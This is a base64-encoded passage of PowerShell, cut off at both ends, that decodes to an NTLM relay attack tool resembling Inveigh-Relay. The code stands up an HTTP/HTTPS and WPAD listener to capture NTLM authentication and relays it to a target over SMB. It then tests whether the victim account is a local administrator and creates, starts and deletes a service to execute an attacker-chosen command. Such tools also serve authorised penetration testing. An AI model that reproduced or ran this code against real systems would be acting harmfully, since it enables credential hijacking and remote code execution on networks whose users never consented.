3JpdGUoJFNNQl9yZWxheV9leGVjdXRlX3NlbmQsIDAsICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kLmxlbmd0aCkKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3RpbWVvdXQgPSBuZXctdGltZXNwYW4gLVNlY29uZHMgJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdG9wd2F0Y2ggPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5EYXRhQXZhaWxhYmxlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfZXhlY3V0ZV9zdG9wd2F0Y2guZWxhcHNlZCAtZ2UgJFNNQl9yZWxheV9leGVjdXRlX3RpbWVvdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU01CIHJlbGF5IHRhcmdldCBkaWRuJ3QgcmVzcG9uZCB3aXRoaW4gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgc2Vjb25kcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgU01CX3JlbGF5X2V4ZWN1dGVfbG9vcAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCRrIC1lcSA1KSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcywgMCwgJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLmxlbmd0aCkKICAgICAgICAgICAgICAgICRTTUJfY29udGV4dF9oYW5kbGVyID0gJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzg4Li4xMDddCgogICAgICAgICAgICAgICAgaWYoKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzEwOC4uMTExXSkgLWVxICcwMC0wMC0wMC0wMCcpIC1hbmQgKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jb250ZXh0X2hhbmRsZXIpIC1uZSAnMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAnKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1sxMDguLjExMV0pIC1lcSAnMDUtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaXMgbm90IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgKz0gIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCgkayAtZXEgNykgLW9yICgkayAtZXEgOSkgLW9yICgkayAtZXEgMTEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLCAwLCAkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMubGVuZ3RoKQoKICAgICAgICAgICAgICAgIHN3aXRjaCgkaykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICA3IHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jb250ZXh0X2hhbmRsZXIgPSAkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbOTIuLjExMV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yX21lc3NhZ2UgPSAiU2VydmljZSBjcmVhdGlvbiBmYXVsdCBjb250ZXh0IG1pc21hdGNoIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAxMSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlID0gIlNlcnZpY2Ugc3RhcnQgZmF1bHQgY29udGV4dCBtaXNtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgMTMgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3JfbWVzc2FnZSA9ICJTZXJ2aWNlIGRlbGV0aW9uIGZhdWx0IGNvbnRleHQgbWlzbWF0Y2giCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY29udGV4dF9oYW5kbGVyWzAuLjNdKSAtbmUgJzAwLTAwLTAwLTAwJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbODguLjkxXSkgLWVxICcxYS0wMC0wMC0xYycpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlIHNlcnZpY2Ugb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3Igb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSAgICAgICAgCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcywgMCwgJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLmxlbmd0aCkgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCghJFNNQl9yZWxheV9mYWlsZWQpIC1hbmQgKCRrIC1lcSA3KSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGVkIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCghJFNNQl9yZWxheV9mYWlsZWQpIC1hbmQgKCRrIC1lcSA5KSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSBjb21tYW5kIGxpa2VseSBleGVjdXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGNvbW1hbmQgbGlrZWx5IGV4ZWN1dGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkU01CUmVsYXlBdXRvRGlzYWJsZSAtZXEgJ3knKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheSA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJTTUIgcmVsYXkgYXV0byBkaXNhYmxlZCBkdWUgdG8gc3VjY2VzcyIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IGF1dG8gZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3MiKV0pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCghJFNNQl9yZWxheV9mYWlsZWQpIC1hbmQgKCRrIC1lcSAxMSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgZGVsZXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAKICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QgPSAoMHgwMCwweDAwLDB4MDAsMHgzNywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOClgCiAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgICAgICArICRTTUJfbXVsdGlwbGV4X0lEYAogICAgICAgICAgICAgICAgKyAoMHgwMCwweDBhLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg1OCwweDAyLDB4NTgsMHgwMiwweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CX3JlbGF5X2ZhaWxlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNNQiByZWxheSBmYWlsZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBmYWlsZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgQlJFQUsgU01CX3JlbGF5X2V4ZWN1dGVfbG9vcAogICAgICAgICAgICB9CgogICAgICAgICAgICAkaysrCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAKICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgCiAgICB9Cn0KCiMgSFRUUC9IVFRQUyBTZXJ2ZXIgU2NyaXB0QmxvY2sgLSBIVFRQL0hUVFBTIGxpc3RlbmVyCiRIVFRQX3NjcmlwdGJsb2NrID0gCnsgCiAgICBwYXJhbSAoJFNNQlJlbGF5VGFyZ2V0LCRTTUJSZWxheUNvbW1hbmQsJFNNQlJlbGF5VXNlcm5hbWVzLCRTTUJSZWxheUF1dG9EaXNhYmxlLCRTTUJSZWxheU5ldHdvcmtUaW1lb3V0LCRNYWNoaW5lQWNjb3VudHMsJFdQQURBdXRoKQoKICAgIEZ1bmN0aW9uIE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgIHsKCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUKICAgICAgICAkSFRUUF90aW1lc3RhbXAgPSAkSFRUUF90aW1lc3RhbXAuVG9GaWxlVGltZSgpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF90aW1lc3RhbXApKQogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9ICRIVFRQX3RpbWVzdGFtcC5TcGxpdCgiLSIpIHwgRk9SRUFDSHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KCiAgICAgICAgaWYoJEludmVpZ2guY2hhbGxlbmdlKQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEludmVpZ2guY2hhbGxlbmdlCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRJbnZlaWdoLmNoYWxsZW5nZS5JbnNlcnQoMiwnLScpLkluc2VydCg1LCctJykuSW5zZXJ0KDgsJy0nKS5JbnNlcnQoMTEsJy0nKS5JbnNlcnQoMTQsJy0nKS5JbnNlcnQoMTcsJy0nKS5JbnNlcnQoMjAsJy0nKQogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMuU3BsaXQoIi0iKSB8IEZPUkVBQ0h7IFtDSEFSXVtDT05WRVJUXTo6dG9pbnQxNigkXywxNil9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9IFtTdHJpbmddKDEuLjggfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzIC1yZXBsYWNlICcgJywgJycKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzLlNwbGl0KCIgIikgfCBGT1JFQUNIeyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgIH0KCiAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuQWRkKCRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcsJyArICRIVFRQX2NoYWxsZW5nZSkgfE91dC1OdWxsCgogICAgICAgIFtieXRlW11dJEhUVFBfTlRMTV9ieXRlcyA9ICgweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMCwweDA2LDB4MDAsMHgwNiwweDAwLDB4MzgsMHgwMCwweDAwLDB4MDAsMHgwNSwweDgyLDB4ODksMHhhMilgCiAgICAgICAgICAgICsgJEhUVFBfY2hhbGxlbmdlX2J5dGVzYAogICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg4MiwweDAwLDB4ODIsMHgwMCwweDNlLDB4MDAsMHgwMCwweDAwLDB4MDYsMHgwMSwweGIxLDB4MWQsMHgwMCwweDAwLDB4MDAsMHgwZiwweDRjLDB4MDAsMHg0MSwweDAwLDB4NDIsMHgwMClgCiAgICAgICAgICAgICsgKDB4MDIsMHgwMCwweDA2LDB4MDAsMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDAsMHgwMSwweDAwLDB4MTAsMHgwMCwweDQ4LDB4MDAsMHg0ZiwweDAwLDB4NTMsMHgwMCwweDU0LDB4MDAsMHg0ZSwweDAwLDB4NDEsMHgwMCwweDRkLDB4MDAsMHg0NSwweDAwKWAKICAgICAgICAgICAgKyAoMHgwNCwweDAwLDB4MTIsMHgwMCwweDZjLDB4MDAsMHg2MSwweDAwLDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwweDAwLDB4NmMsMHgwMCwweDAzLDB4MDAsMHgyNCwweDAwLDB4NjgsMHgwMCwweDZmLDB4MDApYAogICAgICAgICAgICArICgweDczLDB4MDAsMHg3NCwweDAwLDB4NmUsMHgwMCwweDYxLDB4MDAsMHg2ZCwweDAwLDB4NjUsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsMHgwMClgCiAgICAgICAgICAgICsgKDB4NmMsMHgwMCwweDA1LDB4MDAsMHgxMiwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsMHg2MiwweDAwLDB4MmUsMHgwMCwweDZjLDB4MDAsMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLDB4MDAsMHg2YywweDAwLDB4MDcsMHgwMCwweDA4LDB4MDApYAogICAgICAgICAgICArICRIVFRQX3RpbWVzdGFtcGAKICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDBhLDB4MGEpCgogICAgICAgICROVExNX2NoYWxsZW5nZV9iYXNlNjQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkSFRUUF9OVExNX2J5dGVzKQogICAgICAgICROVExNID0gJ05UTE0gJyArICROVExNX2NoYWxsZW5nZV9iYXNlNjQKICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkSFRUUF9jaGFsbGVuZ2UKCiAgICAgICAgUmV0dXJuICROVExNCgogICAgfQogICAgCiAgICB3aGlsZSAoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgIHsKICAgICAgICAkaW52ZWlnaC5jb250ZXh0ID0gJGludmVpZ2guSFRUUF9saXN0ZW5lci5HZXRDb250ZXh0KCkgCiAgICAgICAgJGludmVpZ2gucmVxdWVzdCA9ICRpbnZlaWdoLmNvbnRleHQuUmVxdWVzdAogICAgICAgICRpbnZlaWdoLnJlc3BvbnNlID0gJGludmVpZ2guY29udGV4dC5SZXNwb25zZQogICAgICAgICRpbnZlaWdoLm1lc3NhZ2UgPSAnJwogICAgICAgIAogICAgICAgICROVExNID0gJ05UTE0nCiAgICAgICAgCiAgICAgICAgaWYoJGludmVpZ2gucmVxdWVzdC5Jc1NlY3VyZUNvbm5lY3Rpb24pCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF90eXBlID0gIkhUVFBTIgogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF90eXBlID0gIkhUVFAiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICgoJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgLW1hdGNoICcvd3BhZC5kYXQnKSAtYW5kICgkV1BBREF1dGggLWVxICdBbm9ueW1vdXMnKSkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLlN0YXR1c0NvZGUgPSAyMDAKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgW3N0cmluZ10kYXV0aGVudGljYXRpb25faGVhZGVyID0gJGludmVpZ2gucmVxdWVzdC5oZWFkZXJzLmdldHZhbHVlcygnQXV0aG9yaXphdGlvbicpCiAgICAgICAgCiAgICAgICAgaWYoJGF1dGhlbnRpY2F0aW9uX2hlYWRlci5zdGFydHN3aXRoKCdOVExNICcpKQogICAgICAgIHsKICAgICAgICAgICAgJGF1dGhlbnRpY2F0aW9uX2hlYWRlciA9ICRhdXRoZW50aWNhdGlvbl9oZWFkZXIgLXJlcGxhY2UgJ05UTE0gJywnJwogICAgICAgICAgICBbYnl0ZVtdXSAkSFRUUF9yZXF1ZXN0X2J5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYXV0aGVudGljYXRpb25faGVhZGVyKQogICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gNDAxCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoJEhUVFBfcmVxdWVzdF9ieXRlc1s4XSAtZXEgMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAiICsgJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgKyAiIHJlY2VpdmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcykKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgcmVxdWVzdCBmb3IgIiArICRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsICsgIiByZWNlaXZlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKCiAgICAgICAgICAgICAgICBpZigoJGludmVpZ2guU01CX3JlbGF5KSAtYW5kICgkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgLWVxIDApIC1hbmQgKCRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyAtbmUgJFNNQlJlbGF5VGFyZ2V0KSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAxCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IHRyaWdnZXJlZCBieSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzICsgIiBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgdHJpZ2dlcmVkIGJ5ICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiR3JhYmJpbmcgY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gR3JhYmJpbmcgY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICIgKyAkU01CUmVsYXlUYXJnZXQpXSkKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudAogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LmNvbm5lY3QoJFNNQlJlbGF5VGFyZ2V0LCI0NDUiKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCEkU01CX3JlbGF5X3NvY2tldC5jb25uZWN0ZWQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGlzIG5vdCByZXNwb25kaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9